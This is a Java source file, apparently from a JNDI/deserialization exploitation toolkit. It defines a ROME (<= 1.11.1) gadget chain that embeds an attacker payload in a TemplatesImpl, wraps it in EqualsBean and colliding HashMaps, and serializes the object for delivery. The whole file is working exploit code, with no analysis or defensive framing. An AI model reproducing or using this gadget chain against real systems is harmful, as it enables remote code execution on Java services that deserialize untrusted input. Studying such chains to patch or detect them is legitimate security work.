package sonomon.jndi.deser.gadgets;

import com.rometools.rome.feed.impl.EqualsBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.util.HashMap;
import javax.xml.transform.Templates;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class ROME2 implements SerializeObject{
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);

		//ROME <= 1.11.1
		
        EqualsBean equalsBean = new EqualsBean(String.class, "Sentiment");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("yy",equalsBean); //JDK7和8需要更改put顺序
        map1.put("zZ",tempImpl);
        map2.put("zZ",equalsBean); //JDK7和8需要更改put顺序
        map2.put("yy",tempImpl);
        HashMap hashMap = new HashMap();
        hashMap.put(map1,"1");
        hashMap.put(map2,"1");
        
        try {
        	Deserialize.setFieldValue(equalsBean,"beanClass",Templates.class);
        	Deserialize.setFieldValue(equalsBean, "obj", tempImpl);
        	
		} catch (Exception e) {
			Deserialize.setFieldValue(equalsBean,"_beanClass",Templates.class);
			Deserialize.setFieldValue(equalsBean, "_obj", tempImpl);
		}
        
        return hashMap;
    }
}